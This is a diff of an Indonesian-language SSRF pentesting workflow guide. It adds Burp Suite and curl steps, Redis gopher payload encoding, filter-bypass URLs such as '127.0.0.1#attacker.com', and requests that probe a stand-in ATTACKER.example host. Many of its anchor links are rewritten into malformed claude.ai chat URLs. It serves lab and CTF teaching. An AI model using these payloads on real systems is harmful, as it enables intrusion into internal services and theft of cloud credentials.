@@ -8,7 +8,7 @@ refs_out: ["05","06","11","14a","14c","14d","21","23","35","42","60"]
 refs_in: ["15","20","21","23","27","28","30","31"]
 ---
 
-← [File 21: XXE](/docs/xxe)
+← [File 21: XXE](https://claude.ai/chat/[🧬 21 — XXE Workflow](/docs/xxe))
 
 # 🌐 22 — SSRF Workflow
 
@@ -21,103 +21,107 @@ refs_in: ["15","20","21","23","27","28","30","31"]
 
 # 📚 Daftar Isi
 
-- [🌐 0. SSRF Fundamentals](#-0-ssrf-fundamentals)
+- [🌐 0. SSRF Fundamentals](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-0-ssrf-fundamentals)
     
-    - [0.1 Apa Itu SSRF](#01-apa-itu-ssrf)
+    - [0.1 Apa Itu SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#01-apa-itu-ssrf)
         
-    - [0.2 Kenapa SSRF Berbahaya](#02-kenapa-ssrf-berbahaya)
+    - [0.2 Kenapa SSRF Berbahaya](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#02-kenapa-ssrf-berbahaya)
         
-    - [0.3 Cara Identify SSRF](#03-cara-identify-ssrf)
+    - [0.3 Cara Identify SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#03-cara-identify-ssrf)
         
-    - [0.4 SSRF Attack Surface](#04-ssrf-attack-surface)
+    - [0.4 SSRF Attack Surface](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#04-ssrf-attack-surface)
         
-- [🔬 1. Basic SSRF](#-1-basic-ssrf)
+    - [0.5 Request Acquisition](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#05-request-acquisition)
+        
+- [🔬 1. Basic SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-1-basic-ssrf)
     
-    - [1.1 Deteksi SSRF Awal](#11-deteksi-ssrf-awal)
+    - [1.1 Deteksi SSRF Awal](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#11-deteksi-ssrf-awal)
         
-    - [1.2 SSRF ke Localhost](#12-ssrf-ke-localhost)
+    - [1.2 SSRF ke Localhost](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#12-ssrf-ke-localhost)
         
-    - [1.3 SSRF Internal Port Scanning](#13-ssrf-internal-port-scanning)
+    - [1.3 SSRF Internal Port Scanning](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#13-ssrf-internal-port-scanning)
         
-    - [1.4 SSRF ke Internal Services](#14-ssrf-ke-internal-services)
+    - [1.4 SSRF ke Internal Services](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#14-ssrf-ke-internal-services)
         
-- [☁️ 2. Cloud Metadata SSRF](#-2-cloud-metadata-ssrf)
+- [☁️ 2. Cloud Metadata SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-2-cloud-metadata-ssrf)
     
-    - [2.1 AWS IMDSv1 vs IMDSv2](#21-aws-imdsv1-vs-imdsv2)
+    - [2.1 AWS IMDSv1 vs IMDSv2](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#21-aws-imdsv1-vs-imdsv2)
         
-    - [2.2 AWS Metadata Endpoints](#22-aws-metadata-endpoints)
+    - [2.2 AWS Metadata Endpoints](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#22-aws-metadata-endpoints)
         
-    - [2.3 GCP Metadata](#23-gcp-metadata)
+    - [2.3 GCP Metadata](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#23-gcp-metadata)
         
-    - [2.4 Azure Metadata](#24-azure-metadata)
+    - [2.4 Azure Metadata](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#24-azure-metadata)
         
-    - [2.5 Cara Pakai Stolen Credentials](#25-cara-pakai-stolen-credentials)
+    - [2.5 Cara Pakai Stolen Credentials](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#25-cara-pakai-stolen-credentials)
         
-- [🧩 3. SSRF Filter Bypass](#-3-ssrf-filter-bypass)
+- [🧩 3. SSRF Filter Bypass](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-3-ssrf-filter-bypass)
     
-    - [3.1 IP Address Bypass](#31-ip-address-bypass)
+    - [3.1 IP Address Bypass](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#31-ip-address-bypass)
         
-    - [3.2 Domain Bypass](#32-domain-bypass)
+    - [3.2 Domain Bypass](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#32-domain-bypass)
         
-    - [3.3 URL Parser Bypass](#33-url-parser-bypass)
+    - [3.3 URL Parser Bypass](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#33-url-parser-bypass)
         
-    - [3.4 Protocol Bypass](#34-protocol-bypass)
+    - [3.4 Protocol Bypass](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#34-protocol-bypass)
         
-    - [3.5 Redirect Bypass](#35-redirect-bypass)
+    - [3.5 Redirect Bypass](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#35-redirect-bypass)
         
-    - [3.6 DNS Rebinding](#36-dns-rebinding-konsep)
+    - [3.6 DNS Rebinding](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#36-dns-rebinding-konsep)
         
-- [🚀 4. SSRF Advanced Techniques](#-4-ssrf-advanced-techniques)
+- [🚀 4. SSRF Advanced Techniques](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-4-ssrf-advanced-techniques)
     
-    - [4.1 Gopher Protocol](#41-gopher-protocol-untuk-ssrf)
+    - [4.1 Gopher Protocol](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#41-gopher-protocol-untuk-ssrf)
         
-    - [4.2 SSRF ke Redis via Gopher](#42-ssrf-ke-redis-via-gopher)
+    - [4.2 SSRF ke Redis via Gopher](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#42-ssrf-ke-redis-via-gopher)
         
-    - [4.3 SSRF ke Internal API](#43-ssrf-ke-internal-api)
+    - [4.3 SSRF ke Internal API](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#43-ssrf-ke-internal-api)
         
-    - [4.4 Blind SSRF](#44-blind-ssrf)
+    - [4.4 Blind SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#44-blind-ssrf)
         
-    - [4.5 Semi-Blind SSRF](#45-semi-blind-ssrf)
+    - [4.5 Semi-Blind SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#45-semi-blind-ssrf)
         
-- [📦 5. SSRF di Berbagai Konteks](#-5-ssrf-di-berbagai-konteks)
+- [📦 5. SSRF di Berbagai Konteks](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-5-ssrf-di-berbagai-konteks)
     
-    - [5.1 PDF Generator](#51-ssrf-via-pdf-generator)
+    - [5.1 PDF Generator](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#51-ssrf-via-pdf-generator)
         
-    - [5.2 Image Fetcher](#52-ssrf-via-image-fetcher)
+    - [5.2 Image Fetcher](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#52-ssrf-via-image-fetcher)
         
-    - [5.3 Webhook](#53-ssrf-via-webhook)
+    - [5.3 Webhook](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#53-ssrf-via-webhook)
         
-    - [5.4 URL Preview](#54-ssrf-via-url-preview--link-unfurling)
+    - [5.4 URL Preview](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#54-ssrf-via-url-preview--link-unfurling)
         
-    - [5.5 File Import](#55-ssrf-via-file-import)
+    - [5.5 File Import](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#55-ssrf-via-file-import)
         
-    - [5.6 Header Injection](#56-ssrf-via-header-injection)
+    - [5.6 Header Injection](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#56-ssrf-via-header-injection)
         
-- [💥 6. SSRF to RCE](#-6-ssrf-to-rce)
+- [💥 6. SSRF to RCE](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-6-ssrf-to-rce)
     
-    - [6.1 SSRF → Redis → RCE](#61-ssrf--redis--rce)
+    - [6.1 SSRF → Redis → RCE](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#61-ssrf--redis--rce)
         
-    - [6.2 SSRF → Internal Admin → RCE](#62-ssrf--internal-admin--rce)
+    - [6.2 SSRF → Internal Admin → RCE](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#62-ssrf--internal-admin--rce)
         
-    - [6.3 SSRF → Cloud Metadata → RCE](#63-ssrf--cloud-metadata--rce)
+    - [6.3 SSRF → Cloud Metadata → RCE](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#63-ssrf--cloud-metadata--rce)
         
-    - [6.4 SSRF → Internal CI/CD → RCE](#64-ssrf--internal-cicd--rce)
+    - [6.4 SSRF → Internal CI/CD → RCE](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#64-ssrf--internal-cicd--rce)
         
-- [🧰 7. Tools & Automation](#-7-tools--automation)
+- [🧰 7. Tools & Automation](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-7-tools--automation)
     
-    - [7.1 Interactsh](#71-interactsh-untuk-ssrf-detection)
+    - [7.0 Burp Suite](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#70-burp-suite--primary-interactive-web-testing-interface)
         
-    - [7.2 SSRFmap](#72-ssrfmap)
+    - [7.1 Interactsh](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#71-interactsh-untuk-ssrf-detection)
         
-    - [7.3 Gopherus](#73-gopherus)
+    - [7.2 SSRFmap](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#72-ssrfmap)
         
-    - [7.4 ssrf_test.sh](#74-script-ssrf_testsh)
+    - [7.3 Gopherus](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#73-gopherus)
         
-    - [7.5 ssrf_port_scan.sh](#75-script-ssrf_port_scansh)
+    - [7.4 ssrf_test.sh](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#74-script-ssrf_testsh)
         
-- [🌳 8. Decision Tree](#-8-decision-tree)
+    - [7.5 ssrf_port_scan.sh](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#75-script-ssrf_port_scansh)
+        
+- [🌳 8. Decision Tree](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-8-decision-tree)
     
-- [🛠️ 9. Common Errors & Troubleshooting](#-9-common-errors--troubleshooting)
+- [🛠️ 9. Common Errors & Troubleshooting](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-9-common-errors--troubleshooting)
     
 
 ---
@@ -474,40 +478,159 @@ dalam dua langkah terpisah.
 
 # 0.4 SSRF Attack Surface
 
-| Parameter Name | Common Location    | SSRF Risk      |
-| -------------- | ------------------ | -------------- |
-| `url`          | API/query/body     | 🔴 High        |
-| `uri`          | API/body           | 🔴 High        |
-| `dest`         | redirect/fetch     | 🔴 High        |
-| `destination`  | proxy/import       | 🔴 High        |
-| `path`         | file/import API    | 🟠 Medium–High |
-| `src`          | image/resource     | 🔴 High        |
-| `source`       | import endpoint    | 🔴 High        |
-| `href`         | link/import        | 🟠 Medium–High |
-| `proxy`        | proxy service      | 🔴 High        |
-| `callback`     | callback service   | 🟠 Medium      |
-| `return`       | redirect           | 🟠 Medium      |
-| `next`         | redirect           | 🟠 Medium      |
-| `redirect`     | redirect endpoint  | 🟠 Medium      |
-| `redirect_uri` | OAuth/proxy        | 🟠 Medium–High |
-| `image`        | image fetcher      | 🔴 High        |
-| `image_url`    | avatar/import      | 🔴 High        |
-| `fetch`        | resource fetch     | 🔴 High        |
-| `load`         | resource loader    | 🔴 High        |
-| `remote`       | remote file        | 🔴 High        |
-| `remote_url`   | remote import      | 🔴 High        |
-| `target`       | screenshot/scanner | 🔴 High        |
-| `link`         | preview            | 🔴 High        |
-| `feed`         | RSS/XML importer   | 🔴 High        |
-| `webhook`      | webhook config     | 🔴 High        |
-| `webhook_url`  | webhook config     | 🔴 High        |
-| `host`         | proxy/fetch logic  | 🟠 Medium–High |
-| `domain`       | network checker    | 🟠 Medium      |
-| `endpoint`     | service proxy      | 🔴 High        |
-| `api_url`      | API integration    | 🔴 High        |
-| `import_url`   | import feature     | 🔴 High        |
+|Parameter Name|Common Location|SSRF Risk|
+|---|---|---|
+|`url`|API/query/body|🔴 High|
+|`uri`|API/body|🔴 High|
+|`dest`|redirect/fetch|🔴 High|
+|`destination`|proxy/import|🔴 High|
+|`path`|file/import API|🟠 Medium–High|
+|`src`|image/resource|🔴 High|
+|`source`|import endpoint|🔴 High|
+|`href`|link/import|🟠 Medium–High|
+|`proxy`|proxy service|🔴 High|
+|`callback`|callback service|🟠 Medium|
+|`return`|redirect|🟠 Medium|
+|`next`|redirect|🟠 Medium|
+|`redirect`|redirect endpoint|🟠 Medium|
+|`redirect_uri`|OAuth/proxy|🟠 Medium–High|
+|`image`|image fetcher|🔴 High|
+|`image_url`|avatar/import|🔴 High|
+|`fetch`|resource fetch|🔴 High|
+|`load`|resource loader|🔴 High|
+|`remote`|remote file|🔴 High|
+|`remote_url`|remote import|🔴 High|
+|`target`|screenshot/scanner|🔴 High|
+|`link`|preview|🔴 High|
+|`feed`|RSS/XML importer|🔴 High|
+|`webhook`|webhook config|🔴 High|
+|`webhook_url`|webhook config|🔴 High|
+|`host`|proxy/fetch logic|🟠 Medium–High|
+|`domain`|network checker|🟠 Medium|
+|`endpoint`|service proxy|🔴 High|
+|`api_url`|API integration|🔴 High|
+|`import_url`|import feature|🔴 High|
 
 > Prioritas tertinggi adalah parameter yang memang menghasilkan **server-side outbound request**.
+
+---
+
+# 0.5 Request Acquisition
+
+## 📌 Kapan Digunakan
+
+Sebelum melakukan test apapun. SSRF sink jarang sesederhana `?url=` yang terlihat di address bar — kebanyakan sink ditemukan di dalam **real application traffic**, bukan di endpoint contoh yang dibuat-buat.
+
+---
+
+## SSRF Sink Bisa Muncul di Mana Saja
+
+```text
+query parameter        → ?url=...
+POST form               → url=...
+JSON body               → {"url": "..."}
+nested JSON             → {"config": {"webhook": {"url": "..."}}}
+XML                     → <url>...</url>
+multipart/form-data     → field "avatar_url"
+HTTP header             → X-Forwarded-Host, Referer
+webhook configuration   → saved callback URL
+API body                → internal service-to-service call
+partial URL             → hanya host atau hanya path yang attacker-controlled
+URL embedded in struct  → dalam field lain (mis. config, template, redirect target)
+```
+
+Karena bentuknya bervariasi, workflow ini dimulai dengan **menangkap traffic nyata**, bukan menebak endpoint.
+
+---
+
+## Method A — Burp Suite (Primary)
+
+```text
+Browser
+   │
+   ▼
+Burp Proxy
+   │
+   ▼
+HTTP History
+   │
+   ▼
+Cari request yang "interesting"
+   │
+   ▼
+Send to Repeater
+```
+
+- **Request diperoleh dari**: interaksi normal di aplikasi (upload avatar, set webhook, generate PDF, import file, dsb) yang dilewatkan lewat Burp Proxy.
+- **Cara masuk ke HTTP History**: Proxy → HTTP History, urutkan berdasarkan waktu, cari request dengan parameter/field yang bentuknya URL atau host/path.
+- **Bagaimana dikirim ke Repeater**: klik kanan request → _Send to Repeater_ (atau `Ctrl+R`).
+- **Apa yang diamati**: apakah field tersebut benar-benar dipakai server untuk melakukan outbound fetch (bukan hanya disimpan sebagai string).
+- **Kapan pindah ke tahap berikutnya**: begitu ada kandidat sink yang jelas, lanjut ke [1.1 Deteksi SSRF Awal](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#11-deteksi-ssrf-awal) memakai request yang sama dari Repeater — jangan bangun ulang request dari nol.
+
+## Method B — CLI
+
+Berguna ketika sink sudah diketahui pasti (dari dokumentasi API, source code, atau hasil Burp sebelumnya) dan Anda hanya perlu mereproduksi:
+
+```bash
+curl -i -X POST \
+http://TARGET/fetch \
+-d 'url=https://ATTACKER.example/ssrf-test'
+```
+
+- **Kapan lebih berguna daripada Burp**: reproduksi cepat, scripting, retesting berulang, atau ketika request sudah dipahami sepenuhnya dan tidak perlu eksperimen interaktif lagi.
+
+---
+
+## Repeater sebagai Tempat Eksperimen
+
+Setelah request masuk ke Repeater, perlakukan sebagai tempat eksperimen terkontrol — bukan sekadar "klik Send":
+
+```text
+Captured Request
+      ↓
+HTTP History
+      ↓
+Send to Repeater
+      ↓
+Baseline
+      ↓
+Mutate one variable
+      ↓
+Send
+      ↓
+Compare
+      ↓
+Hypothesis
+      ↓
+Validate
+```
+
+Contoh penataan tab di Repeater:
+
+```text
+Request #1 = external baseline
+Request #2 = localhost
+Request #3 = localhost:8080
+Request #4 = alternate IP representation
+Request #5 = redirect
+```
+
+Mengubah **satu variabel per request** membuat hasil tetap interpretable — begitu dua variabel berubah sekaligus, Anda tidak lagi tahu variabel mana yang menyebabkan perbedaan response. Pola ini dipakai berulang di seluruh workflow ini (localhost, port scanning, filter bypass, blind SSRF) — akan direferensikan sebagai "Repeater sebagai tempat eksperimen" tanpa diulang penuh setiap kali.
+
+---
+
+## Kenapa Ini Penting
+
+```text
+Endpoint contoh yang dibuat-buat
+        ↓
+Tidak merepresentasikan aplikasi nyata
+
+Request nyata dari Burp HTTP History
+        ↓
+Merepresentasikan behavior aplikasi sebenarnya,
+termasuk header, cookie, dan struktur body yang benar
+```
 
 ---
 
@@ -517,7 +640,7 @@ dalam dua langkah terpisah.
 
 ## 📌 Kapan Digunakan
 
-Gunakan segera setelah menemukan endpoint yang menerima URL.
+Gunakan segera setelah menemukan endpoint yang menerima URL (lihat [0.5 Request Acquisition](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#05-request-acquisition) untuk cara menangkap request-nya).
 
 Cara paling bersih adalah memakai domain yang Anda kontrol atau callback service.
 
@@ -529,7 +652,41 @@ https://ATTACKER.example/ssrf-test
 
 ---
 
+## Workflow
+
+```text
+Find URL sink
+      ↓
+Capture real request
+      ↓
+Send to Repeater
+      ↓
+Baseline: external URL (mis. https://ATTACKER.example)
+      ↓
+Mutate: controlled callback URL
+      ↓
+Send → Observe response / OOB interaction
+      ↓
+Classify:
+Candidate / Blind / Full / Semi-blind
+```
+
+Baseline dulu dengan URL eksternal yang jelas-jelas valid — ini yang jadi pembanding untuk semua mutasi berikutnya.
+
+---
+
 ## Basic Test
+
+**Method A — Burp Suite**
+
+Dari request yang sudah ada di Repeater (hasil [Request Acquisition](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#05-request-acquisition)):
+
+1. Baseline: kirim request apa adanya dengan `url=https://ATTACKER.example/ssrf-test`, catat status/length/body.
+2. Ubah hanya nilai parameter `url` ke domain callback yang sama, kirim ulang.
+3. Bandingkan response #1 vs #2 — apakah body memuat konten dari `ATTACKER.example` (indikasi server benar-benar melakukan fetch)?
+4. Kapan pindah tahap: begitu ada perbedaan response yang konsisten, lanjut ke OOB Test untuk validasi tanpa bergantung pada response body.
+
+**Method B — CLI**
 
 ```bash
 curl -i -X POST \
@@ -546,13 +703,22 @@ Fetched:
 SSRF_TEST
 ```
 
-Tetapi response bisa saja tidak berisi body.
+Tetapi response bisa saja tidak berisi body — kapan curl lebih berguna: reproduksi cepat dan scripting begitu payload sudah diketahui bekerja.
 
 ---
 
 ## OOB Test
 
-Dengan callback infrastructure:
+**Method A — Burp Suite**
+
+1. Buka **Burp Collaborator** (Burp Suite tab → Collaborator), generate payload/domain unik.
+2. Di Repeater, ganti nilai `url` dengan domain Collaborator tersebut.
+3. Kirim, lalu poll Collaborator untuk interaksi DNS/HTTP.
+4. Interaksi yang masuk = server-side fetch terbukti, terlepas dari apakah response body terlihat.
+
+**Method B — CLI**
+
+Dengan callback infrastructure (Interactsh atau sejenis):
 
 ```text
 https://YOUR-CALLBACK-ID.example/
@@ -576,6 +742,8 @@ Target server IP
 ```
 
 maka server-side fetch terbukti.
+
+> Fitur/availability Collaborator berbeda antara Burp Community dan Professional — lihat catatan di [4.4 Blind SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#44-blind-ssrf). Jangan asumsikan semua user punya akses Collaborator; Interactsh adalah alternatif yang selalu tersedia.
 
 ---
 
@@ -621,6 +789,37 @@ Internal Admin
 ```
 
 Kandidat SSRF menjadi sangat kuat.
+
+---
+
+## Authenticated SSRF Requests
+
+Pada real web application, sink SSRF sering berada di balik state yang harus dipertahankan:
+
+```text
+Cookie
+Authorization
+CSRF token
+custom headers
+session state
+```
+
+Burp memudahkan ini karena request di Repeater membawa seluruh header/cookie asli dari session Anda — Anda tinggal mengubah satu nilai (`url`) tanpa merekonstruksi ulang auth state.
+
+Contoh generic request:
+
+```http
+POST /api/fetch HTTP/1.1
+Host: TARGET
+Cookie: session=...
+Content-Type: application/json
+
+{
+  "url": "https://example.com"
+}
+```
+
+Yang dimutasi hanya nilai `url` — cookie, header, dan struktur JSON lainnya tetap sama seperti request asli. Untuk reproduksi via curl, copy cookie/header tersebut secara eksplisit ke dalam command (`-H 'Cookie: session=...'`), atau gunakan Burp's _Copy as curl command_ pada request di Repeater agar konsisten dengan apa yang sudah divalidasi manual.
 
 ---
 
@@ -822,6 +1021,40 @@ http://TARGET/fetch
 10250  kubelet
 2375   Docker
 ```
+
+---
+
+## Manual Path — Burp Repeater
+
+Untuk memahami behavior per-port satu per satu (bukan sekadar mengumpulkan angka):
+
+1. Dari request SSRF di Repeater, duplikasi tab per port yang ingin diuji (`Ctrl+R` pada tab yang sama, atau klik kanan → _Duplicate tab_).
+2. Ubah hanya nilai port di `url`, kirim, catat status/length/time di setiap tab.
+3. Bandingkan tab-tab tersebut side-by-side — Repeater menyimpan histori tiap tab sehingga perbandingan tetap terlihat.
+
+Cocok untuk: sedikit port, atau ketika Anda perlu memahami _behavior_ tiap service (bukan hanya ada/tidaknya).
+
+## Automated Path — Intruder atau Script
+
+Ketika jumlah port banyak dan pertanyaannya sederhana ("port mana yang open?"), gunakan otomasi:
+
+- **Burp Intruder**: insertion point pada nilai port, payload type _Numbers_ atau _Simple list_ dari Priority Port List di atas, lalu bandingkan kolom status/length di hasil Intruder.
+- **`ssrf_port_scan.sh` / curl loop**: lihat script di bawah — lebih efisien untuk custom logic atau ketika perlu diintegrasikan ke pipeline lain.
+
+### Kapan Pakai yang Mana
+
+```text
+Few ports / memahami behavior
+→ Repeater
+
+Many predictable values / simple enumeration
+→ Intruder
+
+Complex custom automation (logic/branching/parsing)
+→ curl / Python / Bash script
+```
+
+> Jangan menganggap automation selalu lebih baik. Hasil port scan — dari Intruder maupun script — tetap **heuristic** dan harus divalidasi manual (lihat [1.4 SSRF ke Internal Services](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#14-ssrf-ke-internal-services)) sebelum dianggap sebagai bukti service benar-benar ada.
 
 ---
 
@@ -1742,6 +1975,30 @@ region
 
 # 🧩 3. SSRF Filter Bypass
 
+## Testing Pattern untuk Semua Teknik di Bawah
+
+Setiap teknik bypass di section ini (IP representation, hostname, parser confusion, redirect, DNS rebinding, protocol) mengikuti pola yang sama — jangan mencoba semua payload di tabel secara membabi buta. Pertanyaan yang harus terjawab sebelum mencoba payload berikutnya adalah **"kenapa payload ini dicoba sekarang?"**, bukan "coba semua payload di tabel":
+
+```text
+Hypothesis           (kenapa filter mungkin bisa di-bypass dengan cara ini?)
+      ↓
+Mutation              (ganti satu representasi/nilai)
+      ↓
+Burp Repeater          (kirim, satu variabel berubah per request)
+      ↓
+Response
+      ↓
+Interpretation        (apakah filter ke-bypass, atau justru payload ditolak lebih awal?)
+      ↓
+Validation             (konfirmasi dengan bukti independen — lihat SSRF Proof Levels)
+```
+
+**Method A — Burp Suite**: gunakan Repeater untuk mengubah satu variabel per request (representasi IP, host, atau protokol) dari baseline yang sudah diketahui gagal, lalu bandingkan response. Ini membuat eksperimen tetap _interpretable_ — sama seperti prinsip di [Repeater sebagai Tempat Eksperimen](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#repeater-sebagai-tempat-eksperimen).
+
+**Method B — CLI**: setiap teknik di bawah sudah menyertakan curl yang ekuivalen untuk reproduksi/automation begitu payload yang bekerja ditemukan.
+
+---
+
 # 3.1 IP Address Bypass
 
 ## 📌 Kapan Digunakan
@@ -1916,12 +2173,13 @@ curl -G \
 http://TARGET/fetch
 ```
 
-> ⚠️ **Catatan Ketersediaan & Caveat di Lingkungan Lab/CTF:**
-> Layanan pihak ketiga seperti `nip.io`, `sslip.io`, atau `xip.io` memiliki ketersediaan yang tidak selalu konsisten:
+> ⚠️ **Catatan Ketersediaan & Caveat di Lingkungan Lab/CTF:** Layanan pihak ketiga seperti `nip.io`, `sslip.io`, atau `xip.io` memiliki ketersediaan yang tidak selalu konsisten:
+> 
 > - Banyak environment lab/CTF terisolasi atau firewall memblokir resolusi DNS publik ini.
 > - Layanan publik sewaktu-waktu dapat mengalami downtime.
->
+> 
 > **Alternatif yang Lebih Andal:**
+> 
 > 1. **Domain Milik Sendiri:** Konfigurasikan A record pada domain Anda yang mengarah langsung ke `127.0.0.1` (misal: `local.yourdomain.com`).
 > 2. **Lab Offline / Local Testing:** Manipulasi file `/etc/hosts` atau resolver DNS lokal.
 > 3. **sslip.io:** Gunakan `sslip.io` sebagai alternatif langsung jika `nip.io` diblokir.
@@ -1986,10 +2244,10 @@ Lebih relevan terhadap parser tertentu yang melakukan Windows-style normalizatio
 http://127.0.0.1#attacker.com
 ```
 
-> ⚠️ **Konteks Bypass Menggunakan Karakter Fragment (`#`):**
-> Secara spesifikasi HTTP, karakter fragment (`#`) dan string setelahnya diproses di sisi client dan **tidak pernah dikirimkan** ke server tujuan.
->
+> ⚠️ **Konteks Bypass Menggunakan Karakter Fragment (`#`):** Secara spesifikasi HTTP, karakter fragment (`#`) dan string setelahnya diproses di sisi client dan **tidak pernah dikirimkan** ke server tujuan.
+> 
 > **Bagaimana `#` Menjadi Vektor Bypass?**
+> 
 > - Karakter `#` berguna **BUKAN** untuk mengubah alamat tujuan jaringan (karena HTTP client tetap akan melakukan koneksi ke `127.0.0.1`).
 > - Sebaliknya, `#` berguna untuk **mengelabui validator naive berbasis string/regex**!
 > - Contoh: Jika validator aplikasi memeriksa `if "attacker.com" in url:` atau menggunakan regex yang salah dalam mem-parse hostname, validator melihat `attacker.com` dan meloloskan URL tersebut. Namun saat HTTP client (seperti cURL atau library fetch backend) melakukan koneksi, bagian fragment diabaikan dan request tetap dikirim ke `127.0.0.1`.
@@ -2400,37 +2658,40 @@ Protokol berbasis teks di atas TCP (seperti **Redis RESP**, **SMTP**, **FastCGI*
 
 Ketika menyusun URL Gopher (`gopher://HOST:PORT/_...`), karakter byte kontrol harus di-encode:
 
-| Karakter | Arti | URL Encoded Byte |
+|Karakter|Arti|URL Encoded Byte|
 |---|---|---|
-| `\r` | Carriage Return | `%0D` |
-| `\n` | Line Feed | `%0A` |
-| ` ` | Space (Spasi) | `%20` |
+|`\r`|Carriage Return|`%0D`|
+|`\n`|Line Feed|`%0A`|
+||Space (Spasi)|`%20`|
 
 ### Kenapa `%0D%0A` Sangat Penting di Redis?
+
 Server Redis mem-parse perintah berdasarkan baris yang diakhiri oleh `%0D%0A` (`\r\n`). Jika delimiter ini hilang atau tidak di-encode dengan benar, Redis akan menganggap seluruh teks sebagai satu perintah tidak valid atau mengabaikannya.
 
 ### Contoh Konkret Manual Encoding:
+
 1. **Perintah Sederhana (`PING`):**
-   - Raw: `PING\r\n`
-   - Gopher Encoded: `PING%0D%0A`
-   - URL Gopher: `gopher://127.0.0.1:6379/_PING%0D%0A`
-
+    
+    - Raw: `PING\r\n`
+    - Gopher Encoded: `PING%0D%0A`
+    - URL Gopher: `gopher://127.0.0.1:6379/_PING%0D%0A`
 2. **Perintah Berargumen (`SET key value`):**
-   - Raw: `SET flag CTF{ssrf_success}\r\n`
-   - Gopher Encoded: `SET%20flag%20CTF%7Bssrf_success%7D%0D%0A`
-   - URL Gopher: `gopher://127.0.0.1:6379/_SET%20flag%20CTF%7Bssrf_success%7D%0D%0A`
-
+    
+    - Raw: `SET flag CTF{ssrf_success}\r\n`
+    - Gopher Encoded: `SET%20flag%20CTF%7Bssrf_success%7D%0D%0A`
+    - URL Gopher: `gopher://127.0.0.1:6379/_SET%20flag%20CTF%7Bssrf_success%7D%0D%0A`
 3. **Multi-Command Batching:**
-   ```text
-   AUTH secretpass\r\n
-   SET test 123\r\n
-   QUIT\r\n
-   ```
-   Menjadi:
-   `_AUTH%20secretpass%0D%0ASET%20test%20123%0D%0AQUIT%0D%0A`
+    
+    ```text
+    AUTH secretpass\r\n
+    SET test 123\r\n
+    QUIT\r\n
+    ```
+    
+    Menjadi: `_AUTH%20secretpass%0D%0ASET%20test%20123%0D%0AQUIT%0D%0A`
+    
 
-> ⚠️ **Catatan Double URL-Encoding:**
-> Jika payload gopher dikirimkan sebagai nilai parameter pada HTTP GET request (misal `?url=gopher://...`), karakter `%` harus di-encode ulang menjadi `%25` (sehingga `%0D%0A` menjadi `%250D%250A`) agar tidak ter-decode prematur oleh web server sebelum mencapai fetcher backend!
+> ⚠️ **Catatan Double URL-Encoding:** Jika payload gopher dikirimkan sebagai nilai parameter pada HTTP GET request (misal `?url=gopher://...`), karakter `%` harus di-encode ulang menjadi `%25` (sehingga `%0D%0A` menjadi `%250D%250A`) agar tidak ter-decode prematur oleh web server sebelum mencapai fetcher backend!
 
 ---
 
@@ -2831,23 +3092,42 @@ Callback:
 
 ## Burp Collaborator
 
-Flow:
+**Method A — Burp Suite**
+
+```text
+Request
+ ↓
+HTTP History
+ ↓
+Send to Repeater
